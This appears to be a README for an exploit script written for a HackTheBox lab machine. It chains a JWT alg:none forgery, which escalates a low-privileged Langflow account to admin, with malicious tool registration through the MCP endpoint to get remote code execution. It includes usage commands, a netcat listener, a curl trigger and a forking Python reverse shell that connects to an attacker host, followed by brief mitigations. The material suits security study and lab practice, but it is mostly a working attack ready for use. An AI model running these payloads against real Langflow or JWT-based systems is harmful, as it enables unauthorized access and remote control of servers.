# JWT Privilege Escalation & MCP Tool Injection Exploit

## Overview
This script automates a two-stage attack chain against vulnerable Langflow instances (specifically the Fireflow HTB machine):
1.  **JWT `alg:none` Bypass**: Escalates from a low-privileged user (`langflow-bot`) to an administrator by forging an unsigned JWT token.
2.  **MCP Tool Injection**: Registers a malicious Python tool via the Model Context Protocol (MCP) endpoint to achieve Remote Code Execution (RCE) as the `nightfall` user.

## Vulnerability Context
*   **CVE-2015-9235 (JWT alg:none)**: The server trusts the `alg` field in the JWT header without validation. By setting `alg: none` and removing the signature, an attacker can forge arbitrary claims (e.g., `"role": "admin"`).
*   **MCP STDIO Injection**: The Langflow MCP implementation allows administrators to register custom tools with arbitrary Python code. This code is executed on the server when the tool is called.

## Requirements
*   Python 3
*   `requests` library (`pip install requests`)
*   Target credentials (default for Fireflow: `langflow-bot` / `Langfl0w@mcp2026!`)

## Usage

```bash
python3 jwt_privesc.py -t http://fireflow.htb:30080 -u langflow-bot -p 'Langfl0w@mcp2026!'
```

### Arguments
| Argument | Description | Example |
| :--- | :--- | :--- |
| `-t`, `--target` | Target URL (including protocol and port) | `http://10.10.11.X:30080` |
| `-u`, `--username` | Valid low-privileged username | `langflow-bot` |
| `-p`, `--password` | Valid password for the user | `Langfl0w@mcp2026!` |

## Exploitation Steps

### 1. Automatic Execution
The script performs the following automatically:
1.  **Login**: Authenticates with the provided credentials to obtain a valid user JWT.
2.  **Privilege Check**: Tests if the user token already has admin access.
3.  **Token Forgery**: Decodes the user token, preserves the `sub` (subject), changes the `role` to `admin`, sets `alg` to `none`, and strips the signature.
4.  **Verification**: Tests the forged token against admin endpoints (`/api/v1/tools`).
5.  **Payload Generation**: If successful, it outputs the exact `curl` commands needed to spawn a reverse shell.

### 2. Manual Execution (Post-Exploitation)
Upon success, the script outputs two `curl` commands. Run them in order:

**Step A: Start Listener**
Open a new terminal and start a Netcat listener on port **9001**:
```bash
nc -lvnp 9001
```

**Step B: Register the Malicious Tool**
Copy and run the first `curl` command provided by the script. This sends a POST request to `/api/v1/tools` with the forged token and a payload containing a Python reverse shell.
*   **Payload Logic**: The code uses `os.fork()` to daemonize the process, ensuring the shell survives the HTTP request timeout. It connects back to your IP on port 9001.

**Step C: Trigger the Tool**
Copy and run the second `curl` command provided by the script. This calls the newly registered `shell` tool via the MCP endpoint (`/mcp`), triggering the code execution.

```bash
# Example of the triggered command (IPs auto-updated by script)
curl -s -X POST http://<TARGET_IP>:30080/mcp \
-H 'Content-Type: application/json' \
-H "Authorization: Bearer <FORGED_TOKEN>" \
-d '{"jsonrpc":"2.0","id":4,"method":"tools/call","params":{"name":"shell","arguments":{}}}'
```

### 3. Gaining Access
If successful, the Netcat listener will receive a connection as the `nightfall` user.
```bash
nightfall@fireflow:~$ id
uid=1001(nightfall) gid=1001(nightfall) groups=1001(nightfall)
```

## Technical Details

### The `alg:none` Forge
The script constructs the token manually to ensure no library safeguards interfere:
```python
header = {"alg": "none", "typ": "JWT"}
payload = {"sub": "langflow-bot", "role": "admin"}
# Token format: base64(header).base64(payload).
```
Note the trailing dot `.` indicating an empty signature.

### The Reverse Shell Payload
The injected Python code avoids common pitfalls (like process hanging) by forking:
```python
import socket,os,pty
pid=os.fork()
if pid>0: os._exit(0) # Exit parent
os.setsid()           # New session
pid=os.fork()
if pid>0: os._exit(0) # Exit child
# Redirect sockets to stdin/stdout/stderr
s=socket.socket()
s.connect(("<ATTACKER_IP>",9001))
[os.dup2(s.fileno(), i) for i in (0,1,2)]
pty.spawn("/bin/sh")
```

## Mitigation
*   **JWT**: Explicitly whitelist allowed algorithms (e.g., `HS256`, `RS256`) in your verification library. Never trust the `alg` header from the token itself. Reject `none` explicitly.
*   **MCP/Langflow**: Restrict access to the `/api/v1/tools` and `/mcp` endpoints. Do not allow unauthenticated or low-privileged users to register custom components or tools. Sanitize and sandbox any code execution environments.



